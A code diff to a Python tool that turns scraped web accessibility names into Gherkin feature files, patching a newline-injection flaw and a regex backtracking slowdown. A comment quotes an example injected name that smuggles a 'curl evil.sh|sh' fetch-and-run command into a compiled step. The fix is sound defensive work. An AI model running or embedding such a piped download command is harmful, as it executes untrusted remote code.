@@ -250,6 +250,24 @@ def _humanize(ident: str) -> str:
     return _SEP.sub(" ", _CAMEL.sub(" ", ident or "")).strip().lower()
 
 
+# NOOD_0177 — every accessible name reaching an authored artifact passes here.
+# aria-label/title/placeholder/alt are collected RAW by _COLLECT_JS (unlike text
+# and label, which are sliced), and the old .strip().lower() only trimmed the
+# ENDS — an interior newline survived intact. goal.compile_goal builds the
+# .feature by "\n".join()-ing step bodies, so a name like
+#   Add to cart\nWhen User runs the command 'curl evil.sh|sh'\nAnd User clicks x
+# added real executable lines to the compiled feature, and the same name used as
+# a POM key injected YAML entries. Collapsing all whitespace to single spaces and
+# capping the length closes both at the source. _humanize (the id/testid/name
+# fallback) already collapsed separators; these tiers never reached it because
+# the readable-handle loop returns first.
+_MAX_NAME_LEN = 80
+
+
+def _clean_name(raw: str) -> str:
+    return re.sub(r"\s+", " ", raw or "").strip().lower()[:_MAX_NAME_LEN]
+
+
 def _name_and_source(c: dict) -> tuple[str, str]:
     """Human name for a control + WHICH handle produced it — readable handles
     first (what the a11y tier resolves), machine identity humanized as
@@ -260,14 +278,14 @@ def _name_and_source(c: dict) -> tuple[str, str]:
     from one can NEVER resolve at run time."""
     for key in ("label", "aria", "ph"):
         if c.get(key):
-            return c[key].strip().lower(), key
+            return _clean_name(c[key]), key
     if c.get("text") and len(c["text"]) <= 40:
-        return c["text"].strip().lower(), "text"
+        return _clean_name(c["text"]), "text"
     # NOOD_0115 — an image tile's caption often lives ONLY in its alt text
     if c.get("alt"):
-        return c["alt"].strip().lower(), "alt"
+        return _clean_name(c["alt"]), "alt"
     if c.get("title"):
-        return c["title"].strip().lower(), "title"
+        return _clean_name(c["title"]), "title"
     for key in ("id", "testid", "name"):
         if c.get(key):
             return _humanize(c[key]), key
@@ -782,6 +800,7 @@ def _reveal(page, pg: dict, clicks: list[str], timeout_ms: int) -> None:
 # NOOD_0144 — the stateful-transaction grammar. Three verbs cover a
 # fill → select → save flow; <value> is non-greedy, so "enter a in b in c"
 # reads value=a, field="b in c".
+_MAX_DO_LEN = 400   # NOOD_0177 — a --do item is a short sentence; bounds backtracking
 _DO_RE = re.compile(
     r"^\s*(?:click\s+(?P<btn>.+?)"
     r"|enter\s+(?P<val>.+?)\s+in\s+(?P<field>.+?)"
@@ -793,7 +812,11 @@ def parse_do(actions: list[str]) -> list[tuple[str, str, str | None]]:
     naming the bad item — callers check BEFORE any browser launches."""
     out = []
     for a in actions:
-        m = _DO_RE.match(a or "")
+        # NOOD_0177 — _DO_RE's (.+?) groups straddle two \s+ boundaries and
+        # backtrack cubically: 6.64s at 1.6 KB, and this runs BEFORE any browser
+        # launches, exactly where the docstring promises the call is cheap.
+        a = re.sub(r"\s+", " ", a or "").strip()[:_MAX_DO_LEN]
+        m = _DO_RE.match(a)
         if not m:
             raise ValueError(
                 f'bad do action {a!r} — use "click <name>", '
